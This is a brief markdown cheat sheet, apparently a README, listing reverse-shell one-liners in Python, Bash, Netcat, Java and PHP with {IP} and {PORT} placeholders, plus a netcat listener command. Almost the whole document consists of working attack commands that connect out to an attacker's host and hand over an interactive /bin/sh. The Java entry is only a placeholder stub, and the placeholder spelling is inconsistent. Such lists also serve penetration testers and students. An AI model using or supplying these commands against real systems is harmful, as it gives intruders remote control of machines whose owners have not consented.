Reverse-Shell
=============

A list of Reverse Shells on multiple languages. Replace `{IP}` and `{PORT}` values
with a couple `IP:port` the server can access. Then, on your local machine you open
a listener with `netcat`:

```bash
nc -lvnp {PORT}
```

## Python
```bash
python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{IP}\\",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);\'
```

## Bash
```bash
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
```

## Netcat
```bash
nc -e /bin/sh {IP} {PORT}
```

## Java
```java
r = Runtime.getRuntime();p = r.exec(["your payload"] as String[]);p.waitFor()
```

## PHP
```bash
php -r '\$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'
```

